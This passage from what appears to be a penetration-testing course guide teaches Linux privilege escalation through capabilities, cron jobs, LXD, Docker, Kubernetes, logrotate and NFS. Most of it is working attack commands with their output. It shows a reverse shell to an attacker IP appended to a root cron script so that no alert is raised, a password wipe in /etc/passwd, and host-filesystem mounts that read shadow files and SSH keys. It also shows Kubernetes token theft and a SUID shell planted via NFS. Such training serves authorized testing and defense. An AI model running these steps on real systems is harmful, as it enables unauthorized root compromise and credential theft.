Linux capabilities are a security feature that breaks up the traditional all-or-nothing root privilege model into smaller individual units of privilege that can be granted to specific processes or binaries independently. Instead of running an entire program as root just so it can bind to port 80, you can grant only cap_net_bind_service to that specific binary and it can bind to privileged ports without having any other root-level permissions. This is intended to improve security through the principle of least privilege at the process level. However capabilities become a privilege escalation vector when they are set on binaries that have additional dangerous features — for example if vim is given cap_dac_override which allows bypassing file permission checks, any user who runs that vim binary can read and write any file on the system regardless of permissions.

Setting a capability uses the setcap command:

```bash
$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

### Capability Values Explained

When capabilities are assigned using setcap, three different value suffixes control how the capability is granted and inherited:

```
=      — clears the capability; removes it from the binary
+ep    — grants Effective and Permitted: the binary can use the capability immediately
+ei    — grants Effective and Inheritable: the binary and its child processes inherit the capability
+p     — grants Permitted only: the capability is available but not active until explicitly raised
```

The most dangerous value from an attacker''s perspective is +ep or =eip because it means the capability is immediately active when the binary runs. If you find cap_setuid=eip or cap_dac_override=eip on a binary, that binary is directly exploitable for privilege escalation.

### Important Capabilities Reference Table

```
cap_sys_admin      — broad administrative privileges; modify system files, mount filesystems
cap_sys_chroot     — change root directory; can be used to escape chroot jails
cap_sys_ptrace     — attach to and debug other processes; can read memory of any process
cap_sys_nice       — raise/lower process priority; can starve other processes of CPU
cap_sys_time       — modify the system clock; affects log timestamps and scheduled jobs
cap_sys_resource   — modify resource limits like open file descriptors and memory
cap_sys_module     — load and unload kernel modules; can insert a rootkit kernel module
cap_net_bind_service — bind to ports below 1024; used legitimately by web servers
cap_setuid         — set effective UID; can switch to root UID directly
cap_setgid         — set effective GID; can switch to root GID directly
cap_dac_override   — bypass file read/write/execute permission checks entirely
```

### Enumerating Capabilities

The first step in capability-based privilege escalation is finding every binary on the system that has capabilities set. The getcap tool reads the capabilities from a binary''s extended attributes. Running getcap individually on every binary would take too long, so the find command is used to search all standard binary directories and run getcap on each file automatically. This one command gives you a complete picture of every capability assignment on the system. Run this immediately after landing on a system as part of your standard enumeration.

```bash
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

### What to Do After Finding Capabilities

After running the capability enumeration command, analyse each result. The key question for each capability-set binary is: what does this specific capability allow, and does this binary have any feature that lets me use that capability to read sensitive files, write to restricted files, or spawn a shell?

The most immediately exploitable capabilities are:

**cap_setuid** — if any binary has this set, it can change its own UID to 0 (root). If that binary is an interpreter like Python or Perl, you can write a one-liner to set UID to 0 and spawn a shell:

```bash
$ getcap /usr/bin/python3
/usr/bin/python3 cap_setuid=ep

$ python3 -c ''import os; os.setuid(0); os.system("/bin/bash")''
root@NIX02:~# id
uid=0(root)
```

**cap_dac_override** — if a binary like vim has this set, it can read and write any file bypassing permission checks. Use it to modify /etc/passwd or /etc/sudoers:

```bash
$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```

### Exploiting cap_dac_override with vim

The cap_dac_override capability allows the binary to bypass all file read, write, and execute permission checks on the entire filesystem. When this is set on vim, any user who runs vim can open and modify any file including root-owned files like /etc/passwd and /etc/sudoers. The exploit technique is to use vim to remove the password hash from the root entry in /etc/passwd, replacing the x placeholder with nothing, so that root has no password set and su will accept an empty password to switch to root.

**Step 1** — Check the current root entry in /etc/passwd:

```bash
$ cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash
```

**Step 2** — Use vim with cap_dac_override to remove the password field non-interactively:

```bash
$ echo -e '':%s/^root:[^:]*:/root::/\nwq!'' | /usr/bin/vim.basic -es /etc/passwd
```

**Step 3** — Verify the change:

```bash
$ cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash
```

The x is gone. The root account now has no password.

**Step 4** — Switch to root with no password:

```bash
$ su
Password:          <-- just press Enter
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Moving On

At this point you have covered the complete set of common privilege escalation vectors that rely on misconfigurations and special permissions: restricted shell escapes, PATH abuse, wildcard abuse in cron jobs, SUID and SGID binary exploitation, sudo rights abuse including dangerous flags like tcpdump''s postrotate, privileged group membership exploitation through LXD, Docker, Disk, and ADM, and Linux capabilities enumeration and exploitation. The next areas to investigate in a real engagement are kernel exploits for the specific kernel version identified during enumeration, shared object hijacking against SUID binaries that load shared libraries from writable paths, and NFS root squashing misconfigurations. Always document every finding and every command run, and always attempt the simplest misconfigurations first before moving to more complex exploit techniques.

---

# Part 3: Cron Job Abuse, Containers, Docker, Kubernetes, Logrotate, Miscellaneous Techniques, Python Library Hijacking, Vulnerable Services, Kernel Exploits, Shared Libraries & Shared Object Hijacking

---

## Cron Job Abuse

Cron jobs are scheduled tasks configured to run automatically at specified intervals on Linux systems. They are typically used for administrative tasks such as running backups, cleaning up directories, rotating logs, and other routine maintenance. The crontab command creates a cron file which will be run by the cron daemon on the schedule specified, and when created the cron file is stored in /var/spool/cron for the specific user that created it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, and the command to run. For example the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours. The root crontab is almost always only editable by root or a user with full sudo privileges, however it can still be abused if the scripts it calls are world-writable. Even if you cannot read the crontab directly, you can often determine the schedule by watching how frequently output files are generated.

### Finding World-Writable Files and Cron Scripts

The first step in cron job abuse is finding world-writable files and scripts on the system that might be called by a cron job running as root. The find command below searches the entire filesystem excluding /proc for any file that has the world-write permission bit set. The results reveal which files any user can modify. If a script appears in a location like /dmz-backups/ or /home/backupsvc/ and the directory shows files being generated at regular intervals, that is a strong indicator the script is being executed by a cron job. Certain applications create cron files in /etc/cron.d and may be misconfigured to allow non-root users to edit them, which is worth checking separately.

```bash
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/home/backupsvc/backup.sh
<SNIP>
```

### Identifying the Cron Schedule from Directory Contents

After finding a potentially interesting world-writable script, the next step is to determine how frequently the cron job runs. You can do this by looking at the timestamps of output files in the same directory as the script. If backup archive files are appearing every three minutes, the cron job is running every three minutes. This is also where misconfigured cron schedules are caught — an administrator who intended 0 */3 * * * (every three hours) but wrote */3 * * * * (every three minutes) has made a significant error. The shorter the interval the better for you as an attacker, because you spend less time waiting for your injected payload to execute. Always note the modification timestamps of generated files and compare them to determine the exact interval.

```bash
$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

Files generating every 3 minutes confirms the cron job interval.

### Confirming Cron Jobs with pspy

Pspy is a command-line tool used to view running processes without the need for root privileges. It works by scanning procfs and watching filesystem events using inotify, allowing you to see commands run by other users and cron jobs in real time without needing to read the crontab file directly. The -pf flag tells pspy to print both commands and filesystem events, and -i 1000 sets the scan interval to 1000 milliseconds (every second). When you run pspy and wait, you will see root-owned cron jobs appear in the output with UID=0 as they execute. This is a reliable way to confirm what is running as root even when you cannot read /etc/crontab or /var/spool/cron/crontabs/root.

```bash
$ ./pspy64 -pf -i 1000

2020/09/04 20:46:01 CMD: UID=0  PID=2199 | /usr/sbin/CRON -f
2020/09/04 20:46:01 CMD: UID=0  PID=2200 | /bin/sh -c /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0  PID=2201 | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0  PID=2204 | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html
```

The output confirms backup.sh runs as UID=0 (root) every minute.

### Reading the Target Cron Script

Before modifying the world-writable cron script, always read its contents first to understand exactly what it does and what variables it uses. Understanding the script means you can append your payload at the end without breaking the original functionality — this is important because a broken script might cause the cron daemon to stop running it, which would prevent your payload from executing. You should also take a backup of the original script before making any changes so you can restore it if needed. The script below simply creates a compressed tarball of the web root at a timestamped filename in the backup destination directory.

```bash
$ cat /dmz-backups/backup.sh

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

### Exploiting the World-Writable Cron Script

Now that you understand what the script does, append a reverse shell one-liner to the end of the script. Appending rather than replacing ensures the original script still functions, which keeps the cron job running and avoids alerting the administrator that something has changed. The reverse shell payload uses bash''s built-in TCP redirection to connect back to your netcat listener. Set up the listener first, then modify the script. Wait for the cron interval to pass and you will receive a root shell connection automatically.

```bash
$ cat /dmz-backups/backup.sh

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Start listener on attack machine:

```bash
$ nc -lnvp 443
```

Wait for the cron job to run. Within three minutes:

```
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882

root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
NIX02
```

---

## Containers

Containers operate at the operating system level while virtual machines operate at the hardware level. Containers share the host system''s operating system kernel and isolate application processes from the rest of the system using kernel features like namespaces and cgroups, while classic virtualization allows multiple complete operating systems to run simultaneously on a single physical machine. Isolation and virtualization are essential because they help manage resources and security aspects as efficiently as possible — for example they facilitate monitoring to find errors, and allow isolation of processes that usually require root privileges such as web applications that must be separated from the host system. The two primary container technologies relevant to privilege escalation are Linux Containers (LXC/LXD) and Docker. Understanding how they work is important because membership in the lxd or docker groups on a host provides a straightforward path to root even without any traditional vulnerability.

### Linux Containers — LXC and LXD

Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel. Linux Daemon (LXD) is similar but is designed to contain a complete operating system rather than a single application — it is a system container manager rather than an application container manager. LXD is Ubuntu''s default container manager and upon its installation all users are automatically added to the lxd group. LXC consumes fewer resources than virtual machines and has a standard interface making it easy to manage multiple containers simultaneously. The key privilege escalation technique with LXD works by creating a privileged container with security.privileged=true which disables UID mapping so that the root user inside the container is the same root user as on the host, then mounting the host filesystem into the container.

### LXD — Confirming Group Membership

Before attempting LXD privilege escalation the first step is to confirm your current user belongs to the lxd group. Use the id command which shows all group memberships for the current user. If lxd appears in the groups list you have the permissions needed to create and manage containers. On systems where LXD is installed you can also check whether an LXD-compatible container image is already present on the system in directories like ~/ContainerImages/ because administrators often leave pre-built images for testing purposes. These test images frequently have no passwords set and minimal security configuration, making them easy to use directly for the privilege escalation without needing to download anything from the internet.

```bash
$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

$ cd ContainerImages
$ ls
ubuntu-template.tar.xz
```

### LXD — Importing the Container Image

The next step is to import the available container image into LXD so it can be used to create a new container instance. The lxc image import command takes the archive file and assigns it an alias that you will use to reference it when creating the container. After importing, verify the image was successfully added using lxc image list. The fingerprint, architecture, size, and upload date should all be visible. This step is necessary because LXD needs a registered image before it can spin up a new container from it. If no image exists on the system you would need to transfer one from your attack machine, but in most cases administrators leave at least one template available for their own development and testing use.

```bash
$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
$ lxc image list

+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
| ALIAS               | FINGERPRINT  | PUBLIC | DESCRIPTION                              | ARCHITECTURE | SIZE      |
+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
| ubuntu/18.04        | 623c9f0bde47 | no     | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | 106.49MB  |
+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
```

### LXD — Creating a Privileged Container and Mounting Host Filesystem

This is the core of the LXD privilege escalation. First initialise the container with security.privileged=true which disables all isolation features and makes the root user inside the container identical to root on the host. Then add a device that mounts the host''s root filesystem at /mnt/root inside the container using recursive=true so all subdirectories are included. With security.privileged=true set, the root user inside the container bypasses all filesystem permission checks because the kernel treats it as the actual host root. This gives you read and write access to every file on the host system including /etc/shadow, SSH keys, and any other sensitive data.

```bash
$ lxc init ubuntutemp privesc -c security.privileged=true
Creating privesc

$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

$ lxc start privesc
$ lxc exec privesc /bin/bash

root@nix02:~# id
uid=0(root) gid=0(root)

root@nix02:~# ls -l /mnt/root
total 68
drwxr-xr-x 100 root root 4096 Sep 22 13:27 etc
drwx------   6 root root 4096 Sep 26 21:11 root
<SNIP>

root@nix02:~# cat /mnt/root/etc/shadow
root@nix02:~# cat /mnt/root/root/.ssh/id_rsa
```

---

## Docker

Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. The Docker architecture is built on a client-server model with two primary components: the Docker daemon which is responsible for executing commands and managing containers, and the Docker client which acts as the interface for issuing commands. The Docker daemon handles container creation, execution, monitoring, image management, networking, and storage management. A Docker container is an instance of a Docker image — it is a lightweight isolated executable environment that runs applications with its own filesystem, processes, and network interfaces. From a privilege escalation perspective, membership in the docker group, a writable Docker socket, or Docker having SUID set are all equivalent to root-level access.

### Docker — Architecture Overview

The Docker daemon (also called the Docker server) is the powerhouse behind Docker. It runs Docker containers, interacts with them, and manages them on the host system. It coordinates container creation, execution, and monitoring while maintaining their isolation from the host. It handles Docker image management by pulling images from registries like Docker Hub and storing them locally. It also provides monitoring and logging capabilities, captures container logs, monitors resource utilization such as CPU, memory, and network usage, facilitates container networking by creating virtual networks, and handles Docker volumes which persist data beyond container lifespans. The Docker client communicates with the daemon through a RESTful API or a Unix socket. Docker Compose is another client that simplifies orchestration of multiple containers as a single application using declarative YAML files.

### Docker Group Privilege Escalation

Placing a user in the docker group is essentially equivalent to giving them unrestricted root-level access to the entire host filesystem without requiring a password. Members of the docker group can create new Docker containers and mount any directory from the host into those containers. The attack works by running a new Docker container with the host root directory mounted into it, then browsing the mounted filesystem as root inside the container. The docker run command with -v /root:/mnt mounts the host''s /root directory at /mnt inside the container. Once inside you can read /etc/shadow, SSH keys, or write new SSH keys for persistent root access. The -it ubuntu part simply runs an interactive shell using the Ubuntu image.

```bash
$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

$ docker image ls
REPOSITORY   TAG     IMAGE ID       CREATED       SIZE
ubuntu       20.04   20fffa419e3a   2 days ago    72.8MB

$ docker run -v /root:/mnt -it ubuntu

root@container:/# id
uid=0(root) gid=0(root)

root@container:/# ls /mnt
.bash_history  .ssh  root.txt

root@container:/# cat /mnt/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

### Docker Shared Directories

When using Docker, shared directories (volume mounts) bridge the gap between the host system and the container''s filesystem. With shared directories, specific directories or files on the host system are made accessible within the container, which is incredibly useful for persisting data, sharing code, and facilitating collaboration. However from an attacker''s perspective, when you gain access to a Docker container and enumerate it locally you may find non-standard mounted directories exposed from the host system. These shared directories can contain sensitive data including SSH private keys, bash history files, and application credentials. The key is to look for directories in the container root that do not belong to a standard Linux filesystem layout — names like /hostsystem, /host, /data, or similar are red flags that indicate a host directory has been mounted.

```bash
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw------- 1 cry0l1t3 cry0l1t3 12559 Jun 30 15:09 .bash_history
drwxr-x--- 10 cry0l1t3 cry0l1t3  4096 Jun 30 15:09 .ssh

root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>

$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### Docker Sockets

A Docker socket (also called the Docker daemon socket) is a special file that allows processes to communicate with the Docker daemon. It acts as a bridge between the Docker client and daemon. When you issue a Docker command the client sends it to the Docker socket and the daemon processes and executes it. The socket is normally located at /var/run/docker.sock and is typically only writable by root or members of the docker group. However if you find a Docker socket that is world-writable or accessible to your current user, you can use it to issue Docker commands directly — even if you are not in the docker group. You can also find the Docker socket inside containers themselves if it has been mounted in, which allows escaping the container by using it to spin up new privileged containers.

```bash
$ ls -al ~/app/
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock

$ wget https://<parrot-os>:443/docker -O /tmp/docker
$ chmod +x /tmp/docker

$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID  IMAGE     COMMAND              CREATED    STATUS         NAMES
3fe8a4782311  main_app  "/docker-entry.s..."  3 days ago  Up 12 minutes  app
```

### Docker Socket — Creating a Privileged Escape Container

Once you have access to a Docker socket, whether inside a container or on the host, you can use it to create a new privileged container that mounts the host root filesystem. The command below runs a new container using the main_app image (or any available image), with --privileged flag to disable all security restrictions, mounting the host''s / at /hostsystem inside the new container. Once this privileged container is running, you exec into it and have full root access to the host filesystem at /hostsystem. From there you can read SSH keys, shadow files, or perform any other privileged actions on the host.

```bash
$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID  IMAGE     CREATED          STATUS
7ae3bcc818af  main_app  12 seconds ago   Up 8 seconds
3fe8a4782311  main_app  3 days ago       Up 17 minutes

$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

### Docker Socket — Writable on Host

If the Docker socket at /var/run/docker.sock is writable by your current user without being in the docker group, you can use it directly with the docker command specifying the socket path with -H unix:///var/run/docker.sock. The command below mounts the host root at /mnt inside an Ubuntu container, then immediately runs chroot /mnt bash to change root into the host filesystem and get a full root shell. This is the cleanest and most direct Docker socket escalation technique when the socket is accessible.

```bash
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
total 68
drwxr-xr-x 100 root root 4096 Sep 22 etc
drwx------   6 root root 4096 Sep 26 root
<SNIP>

root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Kubernetes

Kubernetes (K8s) is an open-source container orchestration platform developed by Google that automates the deployment, scaling, and management of application containers. It has become the industry gold standard for microservices orchestration and is used across public cloud services like Google Cloud, Azure, and AWS as well as private on-premises data centers. Kubernetes architecture is divided into a Control Plane (master node) which manages and coordinates all cluster activities, and Worker Nodes (minions) where containerized applications actually run. The key concept in Kubernetes is the pod — a group of one or more closely connected containers that share a network namespace and storage. Understanding Kubernetes security is crucial for penetration testers because during engagements you will frequently land inside a container that is part of a K8s cluster, and the cluster may have misconfigurations that allow escalation to the host or lateral movement to other pods.

### Kubernetes Architecture — Key Components

The Control Plane consists of several critical services each listening on specific TCP ports that are important to know for enumeration and attack:

```
etcd                 — ports 2379, 2380  — stores all cluster state and configuration data
API server           — port 6443         — main entry point for all administrative commands
Scheduler            — port 10251        — decides which node runs each new pod
Controller Manager   — port 10252        — maintains desired cluster state
Kubelet API          — port 10250        — manages containers on each worker node
Read-Only Kubelet    — port 10255        — unauthenticated read-only access to node data
```

The API server is the entry point for all administrative commands from users via kubectl or from controllers. The Kubelet can be configured to permit anonymous access by default, meaning any process or user that can reach the Kubelet API can make requests and receive responses without authentication, potentially exposing sensitive information or enabling unauthorized actions.

### Kubernetes — API Server Interaction

The first step when assessing a Kubernetes environment is to probe the API server to determine what access level you have. The API server listens on port 6443 by default and uses TLS. Use curl with the -k flag to bypass certificate verification. If you receive a 403 Forbidden response mentioning system:anonymous, it means anonymous access is enabled but restricted — the cluster acknowledges your request but denies access to the root path. This still confirms the API server is running and reachable. Some clusters may have broader anonymous access configured, which would allow you to enumerate resources without any credentials. Always check the API server and the Kubelet API separately as they have different access controls.

```bash
$ curl https://10.129.10.11:6443 -k

{
    "kind": "Status",
    "apiVersion": "v1",
    "status": "Failure",
    "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
    "reason": "Forbidden",
    "code": 403
}
```

### Kubernetes — Kubelet API Extracting Pods

The Kubelet API running on port 10250 manages containers on each worker node and is a higher-value target than the main API server in many misconfigured clusters. If the Kubelet allows anonymous access, you can enumerate all running pods and their configurations without any credentials. The /pods endpoint returns a full JSON listing of every pod on the node including their names, namespaces, container images, creation timestamps, and critically the last applied configuration which can contain secrets, API tokens, and passwords. The jq tool is used to format the JSON output for readability. Understanding what pods are running, what images they use, and what their configurations contain is essential for planning the next steps of your attack.

```bash
$ curl https://10.129.10.11:10250/pods -k | jq .

{
  "kind": "PodList",
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c"
      }
    }
  ]
}

$ kubeletctl -i --server 10.129.10.11 pods

+---+----------------------------------+-------------+-------------------------+
|   | POD                              | NAMESPACE   | CONTAINERS              |
+---+----------------------------------+-------------+-------------------------+
| 1 | coredns-78fcd69978-zbwf9         | kube-system | coredns                 |
| 2 | nginx                            | default     | nginx                   |
| 3 | etcd-steamcloud                  | kube-system | etcd                    |
+---+----------------------------------+-------------+-------------------------+
```

### Kubernetes — Scanning for RCE and Executing Commands

After enumerating pods, the next step is to determine which pods are vulnerable to Remote Code Execution. The kubeletctl scan rce command tests each pod for the ability to execute commands and marks those that allow it with a + in the RCE column. This immediately tells you which containers you can execute commands inside without needing any additional credentials. Once you identify a vulnerable pod, use kubeletctl exec to run commands inside it specifying the pod name with -p and the container name with -c. The first command to run is always id to determine what user you are inside the container. Root inside a container opens the door to extracting service account tokens and certificates which can then be used to escalate privileges within the Kubernetes cluster itself.

```bash
$ kubeletctl -i --server 10.129.10.11 scan rce

+---+--------------+------------------+-------------+----------+-----+
|   | NODE IP      | PODS             | NAMESPACE   | CONTNAME | RCE |
+---+--------------+------------------+-------------+----------+-----+
| 1 | 10.129.10.11 | nginx            | default     | nginx    | +   |
| 2 |              | etcd-steamcloud  | kube-system | etcd     | -   |
+---+--------------+------------------+-------------+----------+-----+

$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

### Kubernetes — Extracting Tokens and Certificates

Running as root inside a Kubernetes pod means you can read the service account credentials that are automatically mounted into every pod. These are stored in /var/run/secrets/kubernetes.io/serviceaccount/ and include the token (a JWT used for API authentication) and the ca.crt (the cluster''s certificate authority certificate needed to verify TLS connections to the API server). Extracting both and saving them to files on your attack machine is a critical step because they allow you to authenticate to the Kubernetes API server as the pod''s service account. The tee -a flag both displays the output and saves it to a file simultaneously. Once you have these credentials you can enumerate what permissions the service account has within the cluster.

```bash
$ kubeletctl -i --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZCI6...<SNIP>

$ kubeletctl --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
-----END CERTIFICATE-----
```

### Kubernetes — Listing Privileges and Escalating

With the extracted token and certificate you can now authenticate to the Kubernetes API server and check what actions the service account is permitted to perform. The kubectl auth can-i --list command returns a complete list of all resources and the verbs (get, create, list, delete, etc.) the service account can perform on them. If the service account has permissions to create pods, you can create a malicious pod that mounts the host root filesystem — exactly the same technique as LXD and Docker. The YAML manifest below defines a pod that mounts the host filesystem at /root inside the container, giving you full read and write access to the host from within the pod.

```bash
$ export token=`cat k8.token`
$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.10.11:6443 auth can-i --list

Resources                                    Verbs
pods                                         [get create list]
selfsubjectaccessreviews.authorization.k8s.io [create]
```

privesc.yaml:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 apply -f privesc.yaml
pod/privesc created

$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 get pods
NAME     READY  STATUS   RESTARTS  AGE
nginx    1/1    Running  0         23m
privesc  1/1    Running  0         12s

$ kubeletctl --server 10.129.10.11 exec \
  "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
```

---

## Logrotate

Logrotate is a Linux system utility that manages log files by archiving, compressing, and disposing of old logs on a scheduled basis to prevent the hard disk from filling up with log data. Without logrotate, log files would grow indefinitely until they consumed all available disk space. Logrotate is usually started periodically via cron and its behaviour is controlled by the configuration file /etc/logrotate.conf which contains global settings, and by per-package configuration files dropped into /etc/logrotate.d/. The configuration allows specifying the size threshold for rotation, the age of logs before rotation, how many rotated copies to keep, whether to compress them, and what action to take when a log file is rotated. The rotation function works by renaming log files — new ones are created for each rotation period and older ones are renamed or deleted according to the configuration. Logrotate can be exploited via a vulnerability called logrotten when certain conditions are met.

### Logrotate — Configuration Files

Understanding the logrotate configuration is necessary both for exploitation and for understanding what logs are managed on the system. The main configuration at /etc/logrotate.conf sets global defaults including rotation schedule, how many rotated copies to keep, whether to create new empty log files after rotation, and whether to compress rotated files. Individual package configurations in /etc/logrotate.d/ override these globals for specific log files. The status file at /var/lib/logrotate.status records when each log file was last rotated. The key option to identify for exploitation is whether create or compress is the active rotation method because the logrotten exploit has different versions for each option. The grep command below extracts which option is active.

```bash
$ cat /etc/logrotate.conf

weekly
su root adm
rotate 4
create
include /etc/logrotate.d

$ ls /etc/logrotate.d/
alternatives  apport  apt  bootlog  btmp  dpkg  rsyslog  ufw

$ cat /etc/logrotate.d/dpkg
/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}

$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create
```

### Logrotate — Exploitation with logrotten

The logrotten exploit targets a race condition in logrotate''s log file handling. The requirements to exploit logrotate are: you must have write permissions on the log files being rotated, logrotate must run as root or a privileged user, and the installed version of logrotate must be one of the vulnerable versions: 3.8.6, 3.11.0, 3.15.0, or 3.18.0. The exploit is compiled on a system with a compatible kernel and transferred to the target. A reverse shell payload is written to a file which logrotten will execute during the rotation race condition. The logrotten exploit takes the payload file and the target log file as arguments. Start your netcat listener before running it and you will receive a root shell when the rotation is triggered.

```bash
$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten
$ gcc logrotten.c -o logrotten

$ echo ''bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'' > payload

$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create

$ nc -nlvp 9001

$ ./logrotten -p ./payload /tmp/tmp.log

Connection received on 10.129.24.11 49818
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Miscellaneous Techniques — Passive Traffic Capture

If tcpdump is installed on the system, unprivileged users may be able to capture network traffic depending on the system''s configuration. Captured traffic can contain credentials passed in cleartext over protocols like HTTP, FTP, POP, IMAP, telnet, and SMTP which do not encrypt their communications. Tools like net-creds and PCredz can analyse captured packet data and automatically extract credentials, credit card numbers, SNMP community strings, and other sensitive values. Beyond cleartext credentials, traffic capture can also yield Net-NTLMv2 challenge-response hashes, SMBv2 authentication data, and Kerberos tickets which can be subjected to offline brute force or cracking attacks to recover plaintext passwords. This technique is passive and leaves minimal forensic trace compared to active exploitation.

```bash
$ tcpdump -i ens192 -w /tmp/capture.pcap
$ net-creds /tmp/capture.pcap
$ PCredz -f /tmp/capture.pcap
```

---

## Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. The critical configuration option that determines privilege escalation viability is no_root_squash — when this is set, remote users connecting as root on their own machine will be treated as root on the NFS server as well, allowing creation of files owned by root and setting SUID bits. The default option root_squash maps root access to the unprivileged nfsnobody account preventing this. The attack works by mounting the NFS share from your attack machine as root, compiling a SUID shell binary locally, copying it to the mounted NFS share, and setting the SUID bit — then executing it on the target to get a root shell.

```bash
$ showmount -e 10.129.2.12
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *

$ cat /etc/exports
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Compile the SUID shell on the attack machine:

```c
root@Pwnbox:/tmp$ cat shell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
root@Pwnbox:/tmp$ gcc shell.c -o shell
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell
```

Execute on the target:

```bash
